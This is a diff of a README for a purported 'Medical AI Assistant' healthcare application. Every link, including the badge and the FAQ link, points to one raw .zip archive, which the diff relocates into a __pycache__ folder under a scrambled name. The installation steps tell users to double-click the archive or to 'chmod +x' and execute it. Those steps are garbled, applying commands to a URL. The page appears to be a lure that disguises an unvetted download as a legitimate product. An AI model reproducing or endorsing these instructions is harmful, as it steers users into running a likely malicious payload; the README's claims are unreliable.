@@ -1,6 +1,6 @@
 # 🩺 Medical-AI-Assistant---Production-Ready-Healthcare-Application - Your AI Partner in Patient Care
 
-![Download Medical AI Assistant](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip%20AI%20Assistant-brightgreen)
+![Download Medical AI Assistant](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip%20AI%20Assistant-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Medical AI Assistant. This application is designed to help health
 
 To get the latest version of the Medical AI Assistant, visit the releases page:
 
-[Download Latest Version](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip)
+[Download Latest Version](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip)
 
 ### Step-by-Step Instructions
 
@@ -24,7 +24,7 @@ To get the latest version of the Medical AI Assistant, visit the releases page:
 
 ### For Windows Users:
 
-1. Locate and double-click the downloaded file (it may be named something like `https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip`).
+1. Locate and double-click the downloaded file (it may be named something like `https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip`).
 2. Follow the on-screen prompts to complete the installation.
 3. After installation, look for the Medical AI Assistant icon on your desktop or in the Start menu.
 
@@ -38,8 +38,8 @@ To get the latest version of the Medical AI Assistant, visit the releases page:
 
 1. Open your terminal.
 2. Navigate to the folder where the downloaded file is located.
-3. Run the command `chmod +x https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip` to make it executable.
-4. Execute the file using `https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip`.
+3. Run the command `chmod +x https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip` to make it executable.
+4. Execute the file using `https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip`.
 5. Follow the prompts to complete the installation.
 
 ## 🛠️ System Requirements
@@ -113,7 +113,7 @@ Keep your application updated for the best performance:
 
 ## ➕ Support
 
-If you encounter any issues, please check our [FAQ section](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/campylite/Medical-AI-Assistant---Production-Ready-Healthcare-Application.zip) on GitHub for troubleshooting tips. For further assistance, you can create an issue on the GitHub repository or contact our support team directly through the GitHub page.
+If you encounter any issues, please check our [FAQ section](https://raw.githubusercontent.com/fidashah9297/Medical-AI-Assistant---Production-Ready-Healthcare-Application/master/backend/app/services/__pycache__/Production-A-Application-Assistant-Medical-Healthcare-Ready-2.8.zip) on GitHub for troubleshooting tips. For further assistance, you can create an issue on the GitHub repository or contact our support team directly through the GitHub page.
 
 ## 🌐 Community and Feedback
 
